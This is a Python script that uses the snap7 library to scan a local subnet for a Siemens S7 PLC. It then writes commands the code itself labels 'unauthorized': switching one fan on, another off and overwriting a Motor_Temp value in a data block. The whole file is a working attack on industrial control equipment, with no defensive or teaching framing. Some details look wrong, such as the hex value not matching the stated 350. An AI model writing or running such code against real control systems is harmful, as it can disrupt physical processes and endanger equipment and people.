import socket
import random
import snap7

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same network as the Windows machine
    # and the subnet mask is 255.255.255.0
    for i in range(1, 255):
        ip = f"192.168.1.{i}"
        try:
            client = snap7.S7Client()
            client.ConnectTo(ip, 0, 1)
            client.Disconnect()
            return ip
        except snap7.snap7exceptions.S7ConnectionException:
            pass
    return None

# Function to send unauthorized command message
def send_unauthorized_command(plc_ip):
    # Assuming the PLC is a Siemens S7-1200
    client = snap7.S7Client()
    client.ConnectTo(plc_ip, 0, 1)
    
    # Send an unauthorized command to activate Fan A
    client.WriteArea(snap7.s7const.S7AreaPE, 0, 0, b'\x01')  # Set Activate_Fan_A to TRUE
    
    # Send an unauthorized command to deactivate Fan B
    client.WriteArea(snap7.s7const.S7AreaPE, 0, 1, b'\x00')  # Set Activate_Fan_B to FALSE
    
    # Send an unauthorized command to set Motor_Temp to 350
    client.WriteArea(snap7.s7const.S7AreaDB, 1, 0, b'\x01\x6c')  # Set Motor_Temp to 350
    
    client.Disconnect()

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")
        send_unauthorized_command(plc_ip)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()